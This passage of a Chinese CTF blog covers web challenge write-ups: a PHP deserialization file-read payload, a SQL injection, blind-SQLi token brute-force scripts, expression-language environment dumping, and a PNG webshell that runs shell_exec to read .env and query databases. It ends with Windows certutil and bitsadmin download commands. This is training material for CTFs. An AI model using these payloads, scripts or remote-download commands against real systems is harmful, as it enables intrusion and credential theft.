+<p>curl -i <a href="http://68.183.31.62:991/?gg=O:5:%22SHITS%22:2:{s:10:%22%00SHITS%00url%22;s:33:%22file:///var/www/html/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;}" target="_blank" rel="noopener">http://68.183.31.62:991/?gg=O:5:%22SHITS%22:2:{s:10:%22%00SHITS%00url%22;s:33:%22file:///var/www/html/config%252ephp%22;s:13:%22%00SHITS%00method%22;s:4:%22doit%22;}</a></p>
+</blockquote>
+<p>reference：<br><a href="https://medium.com/bugbountywriteup/fireshell-ctf-2019-web-vice-writeup-2deee8d82556?fbclid=IwAR1Z79PQfI4PftyYcaJ0chJNz0ifKa7XSquQ4N0mAnkCLRNPLbe0YnjVK50" target="_blank" rel="noopener">https://medium.com/bugbountywriteup/fireshell-ctf-2019-web-vice-writeup-2deee8d82556?fbclid=IwAR1Z79PQfI4PftyYcaJ0chJNz0ifKa7XSquQ4N0mAnkCLRNPLbe0YnjVK50</a></p>
+<p><a href="http://yulige.top/?p=545" target="_blank" rel="noopener">http://yulige.top/?p=545</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/30/CTF/Securinets Prequals CTF 2019/"><span>Securinets Prequals CTF 2019</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/30/CTF/Securinets Prequals CTF 2019/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-30T13:20:33.260Z">
+          2019-03-30
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="Securinets-Prequals-CTF-2019"><a href="#Securinets-Prequals-CTF-2019" class="headerlink" title="Securinets Prequals CTF 2019"></a>Securinets Prequals CTF 2019</h1><h2 id="custom-location"><a href="#custom-location" class="headerlink" title="custom location"></a>custom location</h2><p>在url后追加<code>/robots.txt</code>，报错，出现调试页面，仔细观察url，尝试读取文件</p>
+<pre><code>https://web0.ctfsecurinets.com/_profiler/open?file=public/index.php
+</code></pre><p>跟入index.php，发现一行<code>require dirname(__DIR__).&#39;/config/bootstrap.php&#39;;</code><br>于是改payload为<code>file=/config/bootstrap.php</code>，看到：</p>
+<pre><code>&lt;?php
+use Symfony\Component\Dotenv\Dotenv;
+require dirname(__DIR__).&apos;/vendor/autoload.php&apos;;
+// Load cached env vars if the .env.local.php file exists
+// Run &quot;composer dump-env prod&quot; to create it (requires symfony/flex &gt;=1.2)
+if (is_array($env = @include dirname(__DIR__).&apos;/.env.local.php&apos;)) {
+$_SERVER += $env;
+$_ENV += $env;
+} elseif (!class_exists(Dotenv::class)) {
+throw new RuntimeException(&apos;Please run &quot;composer require symfony/dotenv&quot; to load the &quot;.env&quot; files configuring the application.&apos;);
+} else {
+// load all the .env files
+(new Dotenv())-&gt;loadEnv(dirname(__DIR__).&apos;/secret_ctf_location/env&apos;);
+}
+$_SERVER[&apos;APP_ENV&apos;] = $_ENV[&apos;APP_ENV&apos;] = ($_SERVER[&apos;APP_ENV&apos;] ?? $_ENV[&apos;APP_ENV&apos;] ?? null) ?: &apos;dev&apos;;
+$_SERVER[&apos;APP_DEBUG&apos;] = $_SERVER[&apos;APP_DEBUG&apos;] ?? $_ENV[&apos;APP_DEBUG&apos;] ?? &apos;prod&apos; !== $_SERVER[&apos;APP_ENV&apos;];
+$_SERVER[&apos;APP_DEBUG&apos;] = $_ENV[&apos;APP_DEBUG&apos;] = (int) $_SERVER[&apos;APP_DEBUG&apos;] || filter_var($_SERVER[&apos;APP_DEBUG&apos;], FILTER_VALIDATE_BOOLEAN) ? &apos;1&apos; : &apos;0&apos;;
+</code></pre><p>看到了<code>/secret_ctf_location/env</code>，查看该文件，得到flag</p>
+<pre><code># In all environments, the following files are loaded if they exist,
+# the later taking precedence over the former:
+#
+#  * .envcontains default values for the environment variables needed by the app
+#  * .env.local  uncommitted file with local overrides
+#  * .env.$APP_ENV   committed environment-specific defaults
+#  * .env.$APP_ENV.local uncommitted environment-specific overrides
+#
+# Real environment variables win over .env files.
+#
+# DO NOT DEFINE PRODUCTION SECRETS IN THIS FILE NOR IN ANY OTHER COMMITTED FILES.
+#
+# Run &quot;composer dump-env prod&quot; to compile .env files for production use (requires symfony/flex &gt;=1.2).
+# https://symfony.com/doc/current/best_practices/configuration.html#infrastructure-related-configuration
+###&gt; symfony/framework-bundle ###
+APP_ENV=dev
+APP_SECRET=44705a2f4fc85d70df5403ac8c7649fd
+#TRUSTED_PROXIES=127.0.0.1,127.0.0.2
+#TRUSTED_HOSTS=&apos;^localhost|example\.com$&apos;
+###&lt; symfony/framework-bundle ###
+###&gt; doctrine/doctrine-bundle ###
+# Format described at http://docs.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/configuration.html#connecting-using-a-url
+# For an SQLite database, use: &quot;sqlite:///%kernel.project_dir%/var/data.db&quot;
+# Configure your db driver and server_version in config/packages/doctrine.yaml
+DATABASE_URL=mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task
+###&lt; doctrine/doctrine-bundle ###
+###&gt; symfony/swiftmailer-bundle ###
+# For Gmail as a transport, use: &quot;gmail://username:password@localhost&quot;
+# For a generic SMTP server, use: &quot;smtp://localhost:25?encryption=&amp;auth_mode=&quot;
+# Delivery is disabled by default via &quot;null://localhost&quot;
+MAILER_URL=null://localhost
+###&lt; symfony/swiftmailer-bundle ###
+</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>改url为<code>https://web0.ctfsecurinets.com/_profiler</code>，出现一个控制面板<br><img src="https://i.imgur.com/VPA7F39.png" alt="1"></p>
+<p>点击token，进入控制面板，然后查看路由，尝试_profile/phpinfo,但是没什么东西，于是返回控制面版的<code>request/response</code>，点击<code>Server Parameters</code>，在<code>DATABASE_URL</code>字段看到<code>&quot;mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task&quot;</code></p>
+<h2 id="sql-injected"><a href="#sql-injected" class="headerlink" title="sql injected"></a>sql injected</h2><p>题目给出了源码，查看index.php</p>
+<pre><code>if (isset($_POST[&apos;post_author&apos;])) {
+$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;;
+try {
+$posts = $conn-&gt;query($sql);
+} catch(Exception $err) {
+echo &apos;err: &apos;.$err;
+}
+} else {
+$sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;;
+try {
+$posts = $conn-&gt;query($sql);
+} catch(Exception $err) {
+echo &apos;err: &apos;.$err;
+}
+}
+</code></pre><p>这是查询的方式，<code>&quot;SELECT * FROM posts WHERE author = &#39;&quot;. $_SESSION[&#39;username&#39;] .&quot;&#39;&quot;;</code>，无过滤，为漏洞点<br>又查看create_db.sql，字段如下：</p>
+<pre><code>create database webn;
+create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
+create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
+</code></pre><p>flag的条件为<br>flags.php:<code>$_SESSION[&#39;role&#39;] === &#39;1&#39;</code><br>在login.php中：</p>
+<pre><code>if (isset($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) {
+$username = mysqli_real_escape_string($conn, $_POST[&apos;username&apos;]);
+$password = mysqli_real_escape_string($conn, $_POST[&apos;password&apos;]);
+$sql = &quot;SELECT * FROM users WHERE login=&apos;&quot;. $username .&quot;&apos; and password=&apos;&quot;. $password .&quot;&apos;&quot;;
+$res = $conn-&gt;query($sql);
+if($res-&gt;num_rows &gt; 0) {
+$user = $res-&gt;fetch_assoc();
+$_SESSION[&apos;username&apos;] = $user[&apos;login&apos;];
+$_SESSION[&apos;role&apos;] = $user[&apos;role&apos;];
+header(&apos;location: index.php&apos;);
+die();
+} else {
+$success = false;
+}
+}
+</code></pre><p>所以可以构造<code>&#39; UNION SELECT 1, password, login, 4, 5 where role=1 -- asdf</code>，注册，然后重新以root和得到的密码登录</p>
+<h2 id="Beginner’s-Luck"><a href="#Beginner’s-Luck" class="headerlink" title="Beginner’s Luck"></a>Beginner’s Luck</h2><p>源码分析<br><strong>index.php</strong></p>
+<pre><code>function generateRandomToken($length)
+    {
+        //generate random token
+    }
+
+if (!isset($_SESSION[&apos;count&apos;]))
+    {
+    $_SESSION[&apos;count&apos;] = 0;
+    $pass = generateRandomToken(100);
+    $ip = $_SERVER[&apos;REMOTE_ADDR&apos;];
+    $sql = &quot;INSERT INTO users (ip, token) VALUES (?,?)&quot;;
+    $stmt = $pdo-&gt;prepare($sql);
+    $stmt-&gt;execute([$ip, $pass]);
+    }
+</code></pre><p>插入ip和随机生成的token<br><strong>play.php</strong></p>
+<pre><code>&lt;?php
+$max_count = 10;
+
+if (!isset($_SESSION[&apos;count&apos;]))
+    {
+    echo &quot;&lt;h1&gt;Session Expired ! Please click &lt;a href=&apos;start.php&apos;&gt;&lt;/h1&gt; here&lt;/a&gt; &quot;;
+    die();
+    }
+
+require_once (&quot;task_bd.php&quot;);
+
+$currentValue = &apos;&apos;;
+
+if (isset($_POST[&quot;val&quot;]))
+    {
+    if ($_SESSION[&apos;count&apos;] &gt;= $max_count)
+        {
+        header(&quot;Location:reset.php&quot;);
+        die();
+        }
+
+    $_SESSION[&apos;count&apos;]++;
+    try
+        {
+        $sql = &quot;SELECT * FROM users WHERE ip=&apos;&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;] . &quot;&apos; AND token=&apos;&quot; . $_POST[&apos;val&apos;] . &quot;&apos;&quot;;
+        $result = $conn-&gt;query($sql);
+        if ($result)
+            {
+            $row = $result-&gt;fetch_assoc();
+            }
+          else
+            {
+            $row = false;
+            }
+        }
+
+    catch(PDOException $e)
+        {
+
+        // echo $e;
+
+        }
+
+    if ($row)
+        {
+        echo &quot;&lt;h1&gt;True&lt;/h1&gt;&quot;;
+        echo &quot;&lt;div&gt;&lt;h4&gt;Click &lt;a href=&apos;flag.php&apos;&gt;here&lt;/a&gt; and use the token to get your flag&lt;/h4&gt;&lt;/div&gt;&quot;;
+        }
+      else
+        {
+        echo &quot;&lt;h4&gt;Better luck next time !&lt;/h4&gt;&quot;;
+        }
+
+    $currentValue = $_POST[&apos;val&apos;];
+    }
+
+echo &quot;&lt;h3&gt;Attempt: &quot; . ($_SESSION[&apos;count&apos;]) . &quot; / &quot; . $max_count . &quot;&lt;/h2&gt;&lt;br /&gt;&quot;;
+?&gt;
+</code></pre><p>查询对应的token和ip，可知，那就要写script爆破了<br>脚本1：</p>
+<pre><code>import requests
+
+url = &quot;https://web4.ctfsecurinets.com/play.php&quot;
+
+injection = &quot;&apos; OR (ip=&apos;teammate IP&apos; AND substring(token,%s,1)=&apos;%s&apos;) AND &apos;1&apos;=&apos;1&quot;
+token = &apos;&apos;
+
+for i in range(1, 101):
+  for b in &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;:
+# Resetting the session and requesting a new one, just in case.
+# The exploit would have been faster by removing this.
+requests.get(url.replace(&apos;play&apos;, &apos;reset&apos;))
+s = requests.session()
+s.get(url.replace(&apos;play&apos;, &apos;index&apos;))
+c = s.post(url, data={&apos;val&apos;: injection % (i, b)}).content
+if b&apos;&gt;True&lt;&apos; in c:
+  token += b
+  print(i, token)
+  break
+</code></pre><p>脚本2：</p>
+<pre><code>import time
+import random
+import os
+import string
+import requests
+
+token = &quot;&quot;
+found = len(token)
+letters = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+letter_candidate = 0
+payload = &quot;val=&apos; OR (ip=&apos;x.x.x.x&apos; AND token LIKE &apos;{}%&apos;) #&quot;
+headers = {
+   &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);&quot;, 
+   &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
+}
+url_main = &quot;https://web4.ctfsecurinets.com/&quot;
+url_index = url_main + &quot;index.php&quot;
+url_play = url_main + &quot;play.php&quot;
+url_reset = url_main + &quot;reset.php&quot;
+url_start = url_main + &quot;start.php&quot;
+
+global_debug = False
+def debug(page, local_debug):
+   if global_debug and local_debug:
+  print page.status_code
+  print page.headers
+  print page.text
+
+try:
+
+   print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_reset)
+   page = requests.get(url_reset, headers=headers)
+   cookies = {&quot;PHPSESSID&quot;: page.cookies[&quot;PHPSESSID&quot;]}
+   debug(page, False)
+
+
+   while found &lt; 100:
+
+  print &quot;[*] Contacting &apos;{}&apos;.&quot;.format(url_index)
+  page = requests.get(url_index, headers=headers, cookies=cookies)
+  debug(page, False)
+
+  if &quot;Session Expired&quot; in page.text:
+ print &quot;[*] Session expired, contacting &apos;{}&apos;.&quot;.format(url_index)
+ page = requests.get(url_index, headers=headers, cookies=cookies)
+ debug(page, False)
+  elif &quot;Attempt&quot; in page.text:
+ letter = letters[letter_candidate]
+ attempt = token + letter
+ print &quot;[*] Attempt &apos;{}&apos;.&quot;.format(attempt)
+ data = payload.format(attempt)
+ print &quot;[*] Payload: {}.&quot;.format(data)
+ page = requests.post(url_play, data=data, headers=headers, cookies=cookies)
+ debug(page, False)
+
+ if &quot;True&quot; in page.text:
+token += letter
+found += 1
+letter_candidate = 0
+print &quot;[*] Correct letter, new token &apos;{}&apos;.&quot;.format(token)
+ elif &quot;Better luck next time&quot; in page.text:
+letter_candidate = letter_candidate + 1
+print &quot;[*] Wrong letter.&quot; 
+ elif &quot;Max Attempts Reahed&quot; in page.text:
+print &quot;[*] Max attempts reached, contacting &apos;{}&apos;.&quot;.format(url_index)
+page = requests.get(url_index, headers=headers, cookies=cookies)
+debug(page, False)
+ else:
+print &quot;[!] Something not working.&quot;
+break
+
+  # Go to sleep.
+  sleep_interval = 0
+  print &quot;[*] Sleeping {} secs.&quot;.format(sleep_interval)
+  time.sleep(sleep_interval)
+
+except KeyboardInterrupt:
+   print &quot;[-] Interrupted!&quot;    
+</code></pre><h2 id="Trading-values"><a href="#Trading-values" class="headerlink" title="Trading values"></a>Trading values</h2><p>查看网页源码：</p>
+<pre><code>&lt;script&gt;
+
+Highcharts.chart(&apos;container&apos;, {
+chart: {
+type: &apos;spline&apos;,
+animation: Highcharts.svg, // don&apos;t animate in old IE
+marginRight: 10,
+events: {
+load: function () {
+
+// set up the updating of the chart each second
+var series = this.series[0];
+var formula=&quot;KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&quot;;
+setInterval(function () {
+  $.get( &quot;/default&quot;, { &quot;formula&quot;: formula, &quot;values&quot;:{&quot;v1&quot;: &quot;STC&quot;,&quot;v2&quot;:&quot;PLA&quot;,&quot;v3&quot;:&quot;SDF&quot;,&quot;v4&quot;:&quot;OCK&quot;} }   )
+  .done(function( data ) {
+var x = (new Date()).getTime(), // current time
+y = parseInt(data);
+if(y&lt;1000)formula=&quot;KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&quot;;
+else if(y&gt;1000 &amp;&amp; y&lt;10000)formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8xMDApLXYxLmRyZikvKHYxLmF2ZyowLjMpLSh2Mi5hdmcvKCg0LzMpKnYyLm1kcyt2Mi5kbXEqMTAwKSkrKHYzLnBkaSt2My5wZGkrMy8yKig1KnYzLnJhciktNjkqdjMuZ2RwKSsxLjcqKHY0Lm11bSp2NC5kYWQpKjE2LjUqdjQuYXZn&quot;;
+else if(y&gt;10000 &amp;&amp; y&lt;100000)formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8wLjEpLXYxLmRyZikvKHYxLmF2ZyowLjgpLSh2Mi5hdmcvKCgxLzIpKnYyLm1kcy0yNC92Mi5kbXEqMTApKSsodjMucGRpLXYzLnBkaSszLzIqKDIvNSp2My5yYXIpLTY2KnYzLmdkcCkqNy41Lyh2NC5tdW0vdjQuZGFkKSo2LjUvdjQuYXZn&quot;;
+else formula=&quot;KHYxLm1way12MS5kcmYqKHYxLm1way8wLjA2KS12MS5kcmYpLyh2MS5hdmcqMC4yNSkrKHYyLmF2Zy8oKDMvMikvdjIubWRzLTg0L3YyLmRtcSoxOSkpLSh2My5wZGktdjMucGRpKzkvMiooMTIvNyp2My5yYXIpLTY2KnYzLmdkcCkqMC41Lyh2NC5tdW0qKnY0LmRhZCkqMC4zOS92NC5hdmcqKjI=&quot;;
+series.addPoint([x, y], true, true);
+  });
+}, 1000);
+}
+}
+},
+
+time: {
+useUTC: false
+},
+
+title: {
+text: &apos;Live Securinets Trading values&apos;
+},
+xAxis: {
+type: &apos;datetime&apos;,
+tickPixelInterval: 300
+},
+yAxis: {
+title: {
+text: &apos;Value&apos;
+},
+plotLines: [{
+value: 0,
+width: 1,
+color: &apos;#808080&apos;
+}]
+},
+tooltip: {
+headerFormat: &apos;&lt;b&gt;{series.name}&lt;/b&gt;&lt;br/&gt;&apos;,
+pointFormat: &apos;{point.x:%Y-%m-%d %H:%M:%S}&lt;br/&gt;{point.y:.2f}&apos;
+},
+legend: {
+enabled: false
+},
+exporting: {
+enabled: false
+},
+series: [{
+name: &apos;Random data&apos;,
+data: (function () {
+// generate an array of random data
+var data = [],
+time = (new Date()).getTime(),
+i;
+
+for (i = -19; i &lt;= 0; i += 1) {
+data.push({
+x: time + i * 1000,
+y: Math.random()
+});
+}
+return data;
+}())
+}]
+});
+&lt;/script&gt;
+</code></pre><p>注意到有三个base64编码：</p>
+<ul>
+<li><p><code>KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=</code></p>
+</li>
+<li><p><code>KHYxLm1way12MS5kcmYqKHYxLm1way8xMDApLXYxLmRyZikvKHYxLmF2ZyowLjMpLSh2Mi5hdmcvKCg0LzMpKnYyLm1kcyt2Mi5kbXEqMTAwKSkrKHYzLnBkaSt2My5wZGkrMy8yKig1KnYzLnJhciktNjkqdjMuZ2RwKSsxLjcqKHY0Lm11bSp2NC5kYWQpKjE2LjUqdjQuYXZn</code></p>
+</li>
+<li><p><code>KHYxLm1way12MS5kcmYqKHYxLm1way8wLjA2KS12MS5kcmYpLyh2MS5hdmcqMC4yNSkrKHYyLmF2Zy8oKDMvMikvdjIubWRzLTg0L3YyLmRtcSoxOSkpLSh2My5wZGktdjMucGRpKzkvMiooMTIvNyp2My5yYXIpLTY2KnYzLmdkcCkqMC41Lyh2NC5tdW0qKnY0LmRhZCkqMC4zOS92NC5hdmcqKjI=</code></p>
+</li>
+</ul>
+<p>解码分别为：</p>
+<ul>
+<li><p><code>(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg</code></p>
+</li>
+<li><p><code>(v1.mpk-v1.drf*(v1.mpk/100)-v1.drf)/(v1.avg*0.3)-(v2.avg/((4/3)*v2.mds+v2.dmq*100))+(v3.pdi+v3.pdi+3/2*(5*v3.rar)-69*v3.gdp)+1.7*(v4.mum*v4.dad)*16.5*v4.avg</code></p>
+</li>
+<li><p><code>(v1.mpk-v1.drf*(v1.mpk/0.06)-v1.drf)/(v1.avg*0.25)+(v2.avg/((3/2)/v2.mds-84/v2.dmq*19))-(v3.pdi-v3.pdi+9/2*(12/7*v3.rar)-66*v3.gdp)*0.5/(v4.mum**v4.dad)*0.39/v4.avg**2</code></p>
+</li>
+</ul>
+<p>容易知道是图标坐标计算方式<br>注意到requeset方法：<br><code>$.get( &quot;/default&quot;, { &quot;formula&quot;: formula, &quot;values&quot;:{&quot;v1&quot;: &quot;STC&quot;,&quot;v2&quot;:&quot;PLA&quot;,&quot;v3&quot;:&quot;SDF&quot;,&quot;v4&quot;:&quot;OCK&quot;} }   )</code><br>所以可以请求：</p>
+<blockquote>
+<p>GET /default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=&amp;values[v1]=STC&amp;values[v2]=PLA&amp;values[v3]=SDF&amp;values[v4]=OCK HTTP/1.1<br>Host: web1.ctfsecurinets.com<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1</p>
+</blockquote>
+<p>得到response：</p>
+<blockquote>
+<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:19:16 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Cache-Control: private, must-revalidate<br>pragma: no-cache<br>expires: -1<br>Content-Length: 15</p>
+<p>188698.16666667</p>
+</blockquote>
+<p>formula为一种自定义计算方式，中文意思为<strong>公式</strong><br>所以试着改为<code>2*4（Mio0）&lt;base64&gt;</code>即<code>formula=Mio0</code><br>返回了8<br>因此应该有一express的解析器（ 例：<a href="https://github.com/symfony/expression-language）" target="_blank" rel="noopener">https://github.com/symfony/expression-language）</a></p>
+<p>当formula为任意字符串时，返回错误：</p>
+<blockquote>
+<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:26:21 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Cache-Control: private, must-revalidate<br>pragma: no-cache<br>expires: -1<br>Content-Length: 84</p>
+<p>Variable “df” is not valid around position 1 for expression <code>df</code>. Did you mean “v1”?</p>
+</blockquote>
+<p>于是试着改为djE=(v1)，得到：</p>
+<blockquote>
+<p>HTTP/1.1 500 Internal Server Error<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Fri, 29 Mar 2019 16:39:07 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: close<br>Content-Length: 144</p>
+<p>object(App\Entity\STC)#233 (4) {<br>  [“id”:”App\Entity\STC”:private]=&gt;<br>  NULL<br>  [“avg”]=&gt;<br>  int(100)<br>  [“mpk”]=&gt;<br>  int(54)<br>  [“drf”]=&gt;<br>  int(3)<br>}</p>
+</blockquote>
+<p>指向了变量属性，并返回了一些组件，打印出了所有对象<br>因此，值是定义在classpath中的类的对象，添加新的变量v0</p>
+<pre><code>/default?formula=djA=&amp;values[v0]=this&amp;values[v1]=STC&amp;values[v2]=PLA&amp;values[v3]=SDF&amp;values[v4]=OCK
+</code></pre><p>返回了所有环境变量，搜索<code>flag</code>关键字，最终找到</p>
+<h2 id="Unbreakable-Uploader"><a href="#Unbreakable-Uploader" class="headerlink" title="Unbreakable Uploader"></a>Unbreakable Uploader</h2><p>文件上传<br>图片马<br>图片马能够解析的条件是</p>
+<pre><code>AddHandler application/x-httpd-php .png
+AddHandler application/x-httpd-php5 .png
+</code></pre><blockquote>
+<p>Files ending in .png will not execute php code even if they contain php code. You can however execute this code either through a LFI or by uploading a .htaccess file which will add a php handler for .png or in the case of Apache you could use a double file extansion, ie: phppng.php.phppng.</p>
+</blockquote>
+<p>访问控制列表，尝试添加自定义访问规则<br>所以还要知道的就是.htaccess文件</p>
+<p>要求访问数据库<br>接下来使用curl协议：</p>
+<pre><code>#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=id&quot;
+
+#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=pwd&quot;
+
+#curl -i -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=ls ../../../ -lA&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=cat ../../../.env&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database symfony_task_3 -e &apos;show tables&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost -e &apos;show databases&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;show tables&apos;&quot;
+
+#curl -X POST &quot;https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e64d5.png?0=shell_exec&quot; -d &quot;1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e &apos;select * from user_details&apos; | grep Securinets&quot;
+</code></pre><p> reference：<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader" target="_blank" rel="noopener">https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2019#unbreakable-uploader</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
+    <h3 class="article-title"><a href="/2019/03/29/OS/command/"><span>常用指令及其含义(linux 和 windows)</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2019/03/29/OS/command/" rel="bookmark">
+        <time class="entry-date published" datetime="2019-03-29T12:27:04.807Z">
+          2019-03-29
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="常用指令及其含义"><a href="#常用指令及其含义" class="headerlink" title="常用指令及其含义"></a>常用指令及其含义</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h3><p>意义：get pathname of current working directory</p>
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>This module provides functions for determining the pathname of the current working directory. It is recommended that getcwd (or another *cwd() function) be used in all code to ensure portability.</p>
+<p>By default, it exports the functions cwd(), getcwd(), fastcwd(), and fastgetcwd() (and, on Win32, getdcwd()) into the caller’s namespace.</p>
+<p>参考：<a href="https://linux.die.net/man/3/cwd" target="_blank" rel="noopener">https://linux.die.net/man/3/cwd</a></p>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><h3 id="下载文件指令"><a href="#下载文件指令" class="headerlink" title="下载文件指令"></a>下载文件指令</h3><ol>
+<li><p>certutil<br><code>certutil -urlcache -split -f https://www.xxx.com/test.py</code><br><code>certutil -urlcache -split -f https://www.xxx.com/test.py ff.py #指定保存文件名</code></p>
+</li>
+<li><p>bitsadmin<br><code>bitsadmin /transfer n http://www.xx.com/code.jpg c:\users\sdyp\desktop\ff.jpg</code></p>
+</li>
+<li><p>vbs</p>
